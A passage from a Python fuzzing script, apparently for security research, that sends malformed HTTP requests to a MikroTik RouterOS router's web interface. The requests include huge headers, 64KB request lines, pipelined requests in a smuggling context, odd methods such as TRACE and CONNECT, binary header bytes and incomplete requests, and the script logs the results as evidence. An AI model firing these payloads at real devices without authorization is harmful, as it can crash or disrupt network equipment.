        f"Host: {TARGET}\r\n"
        f"X-Huge: {'A' * 131072}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode("utf-8")
    run_test(ec, category, name, description, raw)

    # 7.13 Pipelined requests (HTTP request smuggling context)
    name = "Pipelined requests (2 in 1 send)"
    description = "Send two complete HTTP requests in one TCP segment"
    raw = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"GET /rest/system/resource HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode("utf-8")
    run_test(ec, category, name, description, raw)

    # 7.14 HTTP methods that shouldn't be allowed
    unusual_methods = [
        "OPTIONS", "TRACE", "CONNECT", "PROPFIND", "MKCOL",
        "MOVE", "LOCK", "UNLOCK",
    ]
    for method in unusual_methods:
        name = f"Unusual HTTP method: {method}"
        description = f"Send {method} request to test method handling"
        raw = (
            f"{method} / HTTP/1.1\r\n"
            f"Host: {TARGET}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode("utf-8")
        run_test(ec, category, name, description, raw)

    # 7.15 Binary/non-ASCII payloads in headers
    name = "Binary data in header value (256 bytes)"
    description = "Send header value containing all 256 byte values"
    binary_value = bytes(range(256))
    raw = (
        b"GET / HTTP/1.1\r\n"
        b"Host: " + TARGET.encode() + b"\r\n"
        b"X-Binary: " + binary_value + b"\r\n"
        b"Connection: close\r\n"
        b"\r\n"
    )
    run_test(ec, category, name, description, raw)

    # 7.16 Header with only high-bit characters (0x80-0xFF)
    name = "High-bit chars in header value"
    description = "Send header value with bytes 0x80-0xFF"
    high_bytes = bytes(range(0x80, 0x100)) * 32  # 4KB of high-bit chars
    raw = (
        b"GET / HTTP/1.1\r\n"
        b"Host: " + TARGET.encode() + b"\r\n"
        b"X-HighBit: " + high_bytes + b"\r\n"
        b"Connection: close\r\n"
        b"\r\n"
    )
    run_test(ec, category, name, description, raw)

    # 7.17 Extremely long method + path combined (> 64KB total request line)
    name = "64KB request line (method + path)"
    description = "Send request line that exceeds 64KB in total"
    long_path = "/" + "Z" * 65530
    raw = (
        f"GET {long_path} HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode("utf-8")
    run_test(ec, category, name, description, raw)

    # 7.18 Incomplete HTTP request (no final CRLF)
    name = "Incomplete request (no final CRLF)"
    description = "Send request headers without the terminating empty line"
    raw = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Connection: close\r\n"
    ).encode("utf-8")
    run_test(ec, category, name, description, raw)

    # 7.19 Request with only CRLF (zero-length request)
    name = "Zero-length request (just CRLF)"
    description = "Send only CRLF bytes as the entire request"
    raw = b"\r\n\r\n"
    run_test(ec, category, name, description, raw)

    # 7.20 Massive number of Cookie key=value pairs
    name = "1000 cookie key=value pairs"
    description = "Send Cookie header with 1000 key=value pairs"
    cookie_pairs = "; ".join(f"c{i}=v{i}" for i in range(1000))
    raw = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {TARGET}\r\n"
        f"Cookie: {cookie_pairs}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode("utf-8")
    run_test(ec, category, name, description, raw)


# =============================================================================
# Main
# =============================================================================

def main():
    log("=" * 60)
    log("MikroTik RouterOS CHR 7.20.8 -- HTTP Header/Request Line Overflow Testing")
    log(f"Target: {TARGET}:{PORT}")
    log(f"Script: attack_www_headers.py")
    log("=" * 60)

    # Pre-flight check
    health = check_health()
    if not health.get("alive"):
        log("FATAL: Router is not responding at startup. Aborting.")
        sys.exit(1)
    log(f"Router alive: version={health.get('version')}, "
        f"uptime={health.get('uptime')}, "
        f"cpu={health.get('cpu_load')}%, "
        f"free_mem={health.get('free_memory')}")

    # Ensure evidence directory exists
    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)

    # Initialize evidence collector
    ec = EvidenceCollector("attack_www_headers.py", phase="www_header_overflow")

    try:
        # Section 1: Oversized Individual Headers (~48 tests)
        test_oversized_headers(ec)

        # Section 2: Large Number of Headers (~5 tests)
        test_many_headers(ec)

        # Section 3: Malformed Header Format (~10 tests)
        test_malformed_headers(ec)

        # Section 4: HTTP Request Line Overflow (~13 tests)
        test_request_line_overflow(ec)

        # Section 5: Chunked Transfer Encoding (~5 tests)
        test_chunked_encoding(ec)

        # Section 6: Content-Length Mismatches (~6 tests)
        test_content_length(ec)

        # Section 7: Additional Edge Cases (~64 tests)
        test_additional_edge_cases(ec)

    except KeyboardInterrupt:
        log("Interrupted by user. Saving partial results...")
    except Exception as e:
        log(f"Unhandled error: {e}")
        import traceback
        traceback.print_exc()

    # Save evidence and print summary
    ec.save(EVIDENCE_FILE)
    ec.summary()


if __name__ == "__main__":
    os.chdir("/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik")
    main()
